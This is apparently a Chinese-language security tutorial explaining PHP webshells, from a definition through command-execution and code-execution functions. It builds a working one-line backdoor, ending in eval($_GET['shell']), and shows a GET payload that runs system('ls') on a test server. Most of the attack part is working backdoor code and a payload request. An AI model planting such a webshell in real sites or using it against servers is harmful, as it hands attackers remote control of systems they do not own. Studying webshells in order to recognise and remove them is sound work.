## 1、webshell

关于webshell，百度百科给出的解释如下

> webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后门程序使用，以达到控制网站服务器的目的。

简单来说，webshell就是一个可被服务器解析的恶意代码文件，通过与客户端交互执行恶意代码达到控制服务器的目的。

**原理**

要在目标服务器上执行命令，一定需要相关的命令执行函数，如`system()`等，但这样的后门只能执行单一的命令，还不是很理想。但如果使用php代码执行函数，如`eval()`，则只需要每次发送想要执行的命令执行函数就可以了。

## 2、命令执行函数

##### system()

将参数作为系统命令运行，并输出结果

**实例**

向服务器上传文件`system.php`

```
<?php system("whoami"); ?>

```

## 3、代码执行函数

**assert()**：将参数当做 PHP 代码来执行，官方文档：PHP: assert - Manual

**eval()**：把字符串作为PHP代码执行，官方文档：PHP: eval - Manual

与前面的命令执行函数不同，`eval()`和`assert()`执行的是php代码，通过这种方式构造一句话后门，将真正用于执行命令的代码嵌套进代码执行函数中，就可以随意执行想要的命令了，如下：

```
<?php eval('system("whoami");'); ?>

```

成功执行

![](../Images/3df2b10d7e51636df582746ecd02af9a.png)

image-20211125150109739

那么，只需要在上面代码的基础上，更改用于执行命令的代码，即`system("whoami")`，就可以通过一个后门，向服务器发送想执行的命令。所以，我们需要让这个后门能够自由接收来自客户端的php命令执行代码，如下是使用get方式进行接收：

```
<?php eval($_GET['shell']); ?>

```

构造如下payload

```

http://192.168.1.12/assert.php?shell=system('ls');
```

成功执行命令

![](../Images/a29bf92e749af9f542e232d2f2ba2601.png)
